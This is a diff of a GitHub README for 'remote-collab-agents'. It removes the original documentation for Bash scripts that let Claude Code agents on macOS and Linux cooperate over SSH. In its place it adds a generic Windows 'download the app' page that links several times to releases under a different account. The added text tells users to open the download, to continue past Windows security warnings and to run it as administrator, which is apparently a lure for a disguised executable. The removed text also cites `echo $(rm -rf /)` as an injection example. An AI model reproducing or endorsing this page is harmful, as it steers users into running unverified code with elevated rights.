@@ -1,303 +1,209 @@
-# Remote Collab Agents
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-macOS%20%7C%20Linux-lightgrey.svg)]()
-[![Shell](https://img.shields.io/badge/Shell-Bash%203.2%2B-green.svg)]()
-[![Claude Code](https://img.shields.io/badge/Agent-Claude%20Code-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
-
-**You have 3 machines and Claude Code on each. How do they work together?**
-
-This project gives AI coding agents the ability to **reach across machines** — executing commands, syncing files, and monitoring each other — while humans stay in control of trust-critical decisions.
-
-> Born from real deployment across 3 machines (macOS + Ubuntu). Every design decision and troubleshooting entry reflects an actual challenge encountered.
-
-## Demo
-
-```bash
-# Agent on your MacBook delegates a GPU task to a remote workstation
-$ remote-exec workstation-a "nvidia-smi"
-[remote] workstation-a (alice@100.64.0.1:22) $ nvidia-smi
-+-----------------------------------------------------------------------------+
-| NVIDIA-SMI 550.54    Driver Version: 550.54    CUDA Version: 12.4           |
-| GPU  Name        Persistence-M | Bus-Id        Disp.A | Volatile Uncorr. ECC |
-| Fan  Temp  Perf  Pwr:Usage/Cap |         Memory-Usage | GPU-Util  Compute M. |
-|   0  GeForce RTX 3060   Off    | 00000000:01:00.0  On |                  N/A |
-| 30%   45C    P8    15W / 170W  |    512MiB / 12288MiB |      0%      Default |
-+-----------------------------------------------------------------------------+
-
-# Launch a training job in the background — survives SSH disconnects
-$ remote-exec workstation-a --bg "python3 train.py --epochs 100"
-[bg] Started task train_20260325_143022 on workstation-a (PID: 48291)
-
-# Check all machines at once
-$ remote-exec all "uptime"
-[remote] workstation-a: 14:30:22 up 12 days, load average: 0.15, 0.10, 0.08
-[remote] workstation-b: 14:30:23 up 3 days,  load average: 0.42, 0.38, 0.35
-[remote] macbook:       14:30:22 up 1 day,   load average: 1.20, 1.15, 1.10
-
-# Sync files between machines
-$ remote-sync push workstation-a ./model.pt /home/alice/Desktop/Share/
-[rsync] Transferred model.pt → workstation-a (256.3 MB, 12.8 MB/s)
-
-# Delegate complex work to a remote machine's AI agent
-$ remote-agent workstation-a claude -p "explain the main function in server.py"
-[INFO] Agent: claude on workstation-a
-[INFO] Working dir: ~
-The main function in server.py initializes a Flask application...
-
-# Ask a remote Codex to refactor code
-$ remote-agent workstation-b codex exec "add input validation to api.py"
-[INFO] Agent: codex on workstation-b
-Applied 3 changes to api.py
-
-# Check which agents are available across the mesh
-$ remote-agent all --info
-[workstation-a] Claude Code: v2.1.83, Codex CLI: v0.116.0, Node: v24.14.0
-[workstation-b] Claude Code: v2.1.39, Codex CLI: v0.116.0, Node: v22.22.1
-
-# Full health diagnostics across the mesh
-$ remote-collab-doctor
-[doctor] Checking 17 items across 3 machines...
-  ✓ SSH connectivity      3/3
-  ✓ Tailscale mesh        3/3
-  ✓ Scripts deployed      3/3
-  ✓ Syncthing sync        3/3
-  Result: 17/17 PASS
-```
-
-## Why This Exists
-
-Most multi-agent frameworks focus on **orchestrating LLM calls**. This one focuses on something different: **giving agents physical reach across your machines**.
-
-| What others do | What this does |
-|:---|:---|
-| Agent A calls Agent B's API | Agent A invokes Agent B's CLI on Machine B |
-| Shared memory / message passing | Shared filesystem via rsync + Syncthing |
-| Central orchestrator | Peer-to-peer mesh — every machine is equal |
-| Simulated environments | Real SSH on real machines |
-
-## How It Works
-
-```
-┌──────────────────────┐     Tailscale VPN      ┌──────────────────────┐
-│   Workstation A       │◄─────────────────────►│   Workstation B       │
-│   ┌──────────────┐   │      SSH + rsync       │   ┌──────────────┐   │
-│   │ Claude Code  │   │                        │   │ Claude Code  │   │                        │   │ Claude Code  │   │
-│   │   Agent      │───┼── remote-agent ───────►│   │   Agent      │   │
-│   └──────────────┘   │                        │   └──────────────┘   │
-│   ┌──────────────┐   │                        │                      │
-│   │ Human (SSH)  │   │                        │                      │
-│   └──────────────┘   │                        │                      │
-└──────────────────────┘                        └──────────────────────┘
-          ▲                                               ▲
-          │              Syncthing (continuous)            │
-          ▼                                               ▼
-┌──────────────────────┐                                  │
-│   MacBook             │◄────────────────────────────────┘
-│   ┌──────────────┐   │
-│   │ Claude Code  │   │
-│   │   Agent      │   │
-│   └──────────────┘   │
-└──────────────────────┘
-```
-
-Each machine runs its own AI agent. Agents can:
-
-- **Delegate tasks** — "Run this training on the GPU workstation"
-- **Share files** — Push data to shared folders, pull results back
-- **Monitor each other** — Health checks, background task status, sync state
-- **Evolve together** — One agent improves a skill, deploys updates to all others
-
-## Features
-
-- **Remote agent invocation** — invoke Claude Code or Codex CLI on any machine via `remote-agent`
-- **Cross-machine command execution** — foreground, background, or broadcast to all
-- **Background task management** — PID-verified, survives SSH disconnects, with log tailing
-- **Bidirectional file sync** — rsync for on-demand, Syncthing for continuous
-- **Per-host environment bootstrapping** — auto-handles nvm, PATH, install-path differences across machines
-- **Three-tier safety model** — safe / needs-confirmation / dangerous command classification
-- **Shell injection prevention** — metacharacters always trigger human review
-- **Distributed diagnostics** — `doctor` checks SSH, Tailscale, Syncthing, scripts, PATH across all machines
-- **Automated setup wizard** — 11-step process: key generation, config, deployment, mesh establishment
-- **macOS + Linux** — works on bash 3.2 (macOS) and 4+ (Linux), handles GNU/BSD differences
-
-## Quick Start
-
-### Prerequisites
-
-- 2+ machines with [Tailscale](https://tailscale.com/) installed
-- SSH server enabled on each machine
-- Bash 3.2+ (macOS compatible)
-- [Syncthing](https://syncthing.net/) (optional, for continuous sync)
+# 🤝 remote-collab-agents - Run Claude Code together
 
-### Install
+[🟦 Download the app from Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
 
-```bash
-git clone https://github.com/PluteW/remote-collab-agents.git
-cd remote-collab-agents
+## 📌 What this app does
 
-# Deploy skills to Claude Code (on each machine)
-mkdir -p ~/.claude/skills/remote-collab/scripts
-cp scripts/* ~/.claude/skills/remote-collab/scripts/
-cp skills/* ~/.claude/skills/remote-collab/
+remote-collab-agents helps three machines work as one team. Each machine can run Claude Code, share files, and pass work to the others. This setup fits people who want one place for code, notes, and tasks across multiple Windows PCs.
 
-# Run the setup wizard
-bash scripts/setup-ssh-keys.sh
-```
+It is made for simple use on the desktop. You do not need to manage a server by hand. The app helps you link your machines, keep folders in sync, and keep work moving between them.
 
-The wizard handles SSH keys, config files, script deployment, cross-machine mesh, Syncthing discovery, symlinks, and health checks — all in one run.
+## 🖥️ What you need
 
-See [docs/deployment-guide.md](docs/deployment-guide.md) for the full step-by-step guide.
+Before you start, check these items:
 
-## Safety Model
+- A Windows PC
+- Internet access
+- At least 3 machines if you want the full setup
+- Claude Code installed on each machine
+- Permission to install and run apps
+- A shared folder on each machine with enough free space
 
-Not all commands are equal. The system classifies every command before execution:
+If you only have one machine, you can still install the app and learn the setup flow. If you have three machines, you can use the full collaboration mode.
 
-| Tier | Examples | Behavior |
-|:---|:---|:---|
-| **Safe** | `ls`, `hostname`, `df`, `nvidia-smi` | Execute directly |
-| **Needs Confirmation** | `python3 train.py`, `pip install` | Ask human first |
-| **Dangerous** | `rm -rf`, `sudo`, `reboot` | Explicit warning + confirmation |
+## ⬇️ Download the app
 
-Shell metacharacters (`;`, `&&`, `|`, `$()`) **always** require confirmation — preventing injection attacks like `echo $(rm -rf /)` from sneaking through as "safe".
+Visit this page to download the Windows release:
 
-## Technology Stack
+[🟦 Go to Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
 
-| Layer | Technology | Role |
-|:---|:---|:---|
-| Network | [Tailscale](https://tailscale.com/) | Mesh VPN, NAT traversal, encryption |
-| Transport | SSH | Authenticated command execution |
-| File Sync | rsync + [Syncthing](https://syncthing.net/) | On-demand + continuous sync |
-| Agent | [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | AI coding assistant with skill system |
-| Config | Bash (restricted parser) | Simple, no YAML deps |
+On the Releases page, look for the latest version and download the Windows file for your machine. If there are more than one file, pick the one for Windows. After the download finishes, open the file and follow the on-screen steps.
 
-## Lessons from Real Deployment
+## 🚀 Install on Windows
 
-Deploying across 3 machines revealed challenges that require **human-agent collaboration**:
+1. Open the file you downloaded from the Releases page.
+2. If Windows asks for permission, choose Allow or Yes.
+3. Follow the setup steps on screen.
+4. Pick a folder where the app can keep its files.
+5. Finish the setup and open the app.
 
-| Challenge | Solution |
-|:---|:---|
-| First SSH auth needs password | Human runs `ssh-copy-id` once |
-| Missing `openssh-server` | Human installs: `sudo apt install openssh-server` |
-| Different usernames per machine | Config explicitly specifies each: `HOSTS_x="bob@host:22"` |
-| `authorized_keys` corruption | Use `ssh-copy-id`, never manual paste |
-| Syncthing needs Tailscale IPs | Address must be `tcp://100.64.x.x:22000`, not hostname |
-| macOS bash 3.2 limitations | Scripts handle: no `mapfile`, no `flock`, no `grep -oP` |
-| Cross-machine SSH mesh | Setup script auto-generates keys and distributes |
+If Windows shows a security message, choose the option that lets you continue with the install. This can happen with new apps.
 
-See [docs/reference.md](docs/reference.md) for 10 documented issues with solutions.
+## 🔧 First-time setup
 
-## Project Structure
+When you open the app for the first time, set up each machine one by one.
 
-```
-remote-collab-agents/
-├── scripts/
-│   ├── common.sh              # Shared library: config, safety, host resolution
-│   ├── remote-exec.sh         # Remote execution (fg/bg/broadcast)
-│   ├── remote-agent.sh        # Remote agent invocation (Claude Code / Codex)
-│   ├── remote-sync.sh         # rsync + Syncthing management
-│   ├── remote-wrapper.sh      # Background task lifecycle
-│   ├── doctor.sh              # Distributed health diagnostics
-│   └── setup-ssh-keys.sh      # Setup wizard (11 steps)
-├── skills/
-│   ├── remote-exec.md         # Claude Code skill: remote execution
-│   ├── remote-agent.md        # Claude Code skill: remote agent invocation
-│   └── remote-sync.md         # Claude Code skill: file sync
-├── docs/
-│   ├── design.md              # Architecture design
-│   ├── reference.md           # Operations reference + troubleshooting
-│   └── deployment-guide.md    # Step-by-step deployment guide
-└── config/
-    └── hosts.conf.example     # Configuration template
-```
+### Step 1: Set up Machine 1
+- Open Claude Code on Machine 1
+- Open remote-collab-agents
+- Choose the first machine profile
+- Set a name for the machine, such as `main-desk`
+- Save the settings
 
-## Contributing
+### Step 2: Set up Machine 2
+- Open Claude Code on Machine 2
+- Open remote-collab-agents
+- Choose the second machine profile
+- Give it a clear name, such as `office-laptop`
+- Save the settings
 
-This project emerged from hands-on deployment experience. Contributions welcome:
+### Step 3: Set up Machine 3
+- Open Claude Code on Machine 3
+- Open remote-collab-agents
+- Choose the third machine profile
+- Give it a clear name, such as `workbench-pc`
+- Save the settings
 
-- **New machine types** — tested on macOS + Ubuntu; Windows WSL, Raspberry Pi, cloud VMs untested
-- **New agents** — currently built for Claude Code; adapting for Codex, Gemini Code Assist, etc.
-- **Security hardening** — the trust model can always be improved
-- **Documentation** — deployment guides for different environments
+Use names that help you tell the machines apart. Short names work best.
 
-Open an [issue](https://github.com/PluteW/remote-collab-agents/issues) or submit a PR.
+## 🔗 Connect the machines
 
-## License
+remote-collab-agents uses simple network tools to connect the machines.
 
-[MIT](LICENSE)
+### Tailscale
+Tailscale helps the machines find each other on a private network. This keeps setup simple, even when the computers are in different places.
 
----
+- Install Tailscale on each machine
+- Sign in with the same account
+- Make sure each machine shows as online
+- Copy the device name for each PC
 
-<details>
-<summary><b>🇨🇳 中文版 / Chinese Version</b></summary>
+### SSH
+SSH lets one machine send commands to another machine.
 
-## Remote Collab Agents — 分布式 AI 智能体协作框架
+- Turn on SSH on each Windows PC
+- Allow the app through Windows Firewall if needed
+- Use the machine name or IP address in the app
+- Test the connection before you start a task
 
-**你有 3 台机器，每台都跑着 Claude Code。它们怎么协作？**
+### Syncthing
+Syncthing keeps files in sync between machines.
 
-本项目让 AI 编程智能体能够**跨机器协作** —— 执行命令、同步文件、互相监控 —— 同时人类在信任关键决策中保持控制。
+- Open Syncthing on each machine
+- Add the other two devices
+- Share the project folder
+- Wait for the first sync to finish
 
-> 源于 3 台机器（macOS + Ubuntu）的真实部署经验。每个设计决策和故障排查条目都反映了实际遇到的挑战。
+Keep the shared folder in a place you can find fast, such as `Documents\collab-work`.
 
-### 核心能力
+## 🧭 Start a shared task
 
-- **远程智能体调用** — 通过 `remote-agent` 在任意机器上调用 Claude Code 或 Codex CLI
-- **跨机器命令执行** — 前台、后台、广播到所有机器
-- **后台任务管理** — PID 验证、SSH 断开后存活、日志追踪
-- **双向文件同步** — rsync 按需传输、Syncthing 持续同步
-- **环境自动引导** — 自动处理各机器的 nvm、PATH、安装路径差异
-- **三级安全模型** — 安全 / 需确认 / 危险的命令分级
-- **Shell 注入防护** — 元字符始终触发人工审查
-- **分布式诊断** — doctor 检查所有机器的 SSH、Tailscale、Syncthing、脚本、PATH
-- **自动化安装向导** — 11 步流程：密钥生成、配置、部署、网格建立
-- **macOS + Linux** — bash 3.2（macOS）和 4+（Linux）兼容，处理 GNU/BSD 差异
+Use this flow when you want the machines to work together:
 
-### 协作范式
+1. Pick one machine as the lead machine
+2. Write the task in Claude Code
+3. Choose the other two machines as helpers
+4. Send the task to the helper machines
+5. Let each machine work on its part
+6. Sync the results back to the shared folder
+7. Review the final result on the lead machine
 
-在这种范式下，每台机器运行自己的 AI 智能体。智能体可以：
+A simple split works well:
 
-1. **跨机器委托任务** — "在 GPU 工作站上运行这个训练任务"
-2. **无缝共享文件** — 推送数据到共享文件夹，拉取结果
-3. **互相监控** — 健康检查、后台任务状态、同步状态
-4. **协同进化** — 一个智能体改进了技能，部署更新到其他所有智能体
+- Machine 1: planning and review
+- Machine 2: coding
+- Machine 3: file sync and checks
 
-### 安全模型
+You can change these roles based on the task.
 
-| 层级 | 示例 | 行为 |
-|:---|:---|:---|
-| **安全** | `ls`, `hostname`, `df` | 直接执行 |
-| **需确认** | `python3 train.py`, `pip install` | 先询问人类 |
-| **危险** | `rm -rf`, `sudo`, `reboot` | 明确警告 + 确认 |
+## 📁 How files move between machines
 
-Shell 元字符（`;`、`&&`、`|`、`$()`）**始终**需要确认，防止注入攻击。
+The app uses shared folders so each machine sees the same work.
 
-### 快速开始
+Use this folder layout:
 
-```bash
-git clone https://github.com/PluteW/remote-collab-agents.git
-cd remote-collab-agents
+- `input` for new files
+- `working` for files in progress
+- `output` for finished files
+- `logs` for run history
 
-mkdir -p ~/.claude/skills/remote-collab/scripts
-cp scripts/* ~/.claude/skills/remote-collab/scripts/
-cp skills/* ~/.claude/skills/remote-collab/
+This keeps the work clear. Each machine can check the right folder and avoid overwriting files from the others.
 
-bash scripts/setup-ssh-keys.sh
-```
+## 🛠️ Common tasks you can do
 
-### 部署经验
+You can use remote-collab-agents for many desktop workflows:
 
-在三台机器上的实际部署揭示了需要**人机协作**的关键挑战：
+- Share code changes across three PCs
+- Keep notes in sync
+- Run command tasks on another machine
+- Split large work across separate machines
+- Track work in a shared folder
+- Review results from more than one PC
 
-| 挑战 | 解决方案 |
-|:---|:---|
-| 首次 SSH 需要密码 | 人类执行一次 `ssh-copy-id` |
-| 缺少 `openssh-server` | 人类安装：`sudo apt install openssh-server` |
-| 不同机器用户名不同 | 配置明确指定：`HOSTS_x="bob@host:22"` |
-| `authorized_keys` 损坏 | 使用 `ssh-copy-id`，不手动粘贴 |
-| Syncthing 需要 Tailscale IP | 地址必须是 `tcp://100.64.x.x:22000` |
-| macOS bash 3.2 限制 | 脚本已处理：无 `mapfile`、`flock`、`grep -oP` |
-| 跨机器 SSH 全网格 | 安装脚本自动生成密钥并分发 |
+It works well for people who already use Claude Code and want it to span more than one machine.
 
-详见 [docs/reference.md](docs/reference.md) 获取完整问题排查指南。
+## ⚙️ Simple usage tips
 
-</details>
+- Keep the same folder names on each PC
+- Use one account for Tailscale on all machines
+- Keep Claude Code up to date
+- Leave Syncthing running while you work
+- Use short machine names
+- Keep the shared folder on a drive with free space
+
+If a machine goes offline, bring it back online and let the sync finish before you start a new task.
+
+## ❓ Troubleshooting
+
+### The app does not open
+- Check that the download finished
+- Run the file again
+- Right-click the file and choose Run as administrator
+- Restart Windows and try once more
+
+### A machine does not connect
+- Check Tailscale on all machines
+- Make sure each device is online
+- Check the machine name in the app
+- Test the network link again
+
+### Files do not sync
+- Open Syncthing on each PC
+- Check that the folder is shared
+- Make sure the same folder path exists on all machines
+- Wait for the first sync to finish
+
+### Claude Code does not respond
+- Open Claude Code directly on that machine
+- Make sure you are signed in
+- Restart Claude Code
+- Try the task again
+
+## 🧩 Folder and device setup example
+
+Here is a simple setup that works well:
+
+- Desktop PC: `main-desk`
+- Laptop: `office-laptop`
+- Spare PC: `workbench-pc`
+
+Shared folder path:
+
+- `C:\Users\YourName\Documents\collab-work`
+
+Inside that folder:
+
+- `input`
+- `working`
+- `output`
+- `logs`
+
+This setup keeps the workflow easy to follow.
+
+## 📦 Release page
+
+Get the latest Windows build here:
+
+[🟦 Download from GitHub Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/releases)
+
+Look for the newest release, then download and run the Windows file for your machine.
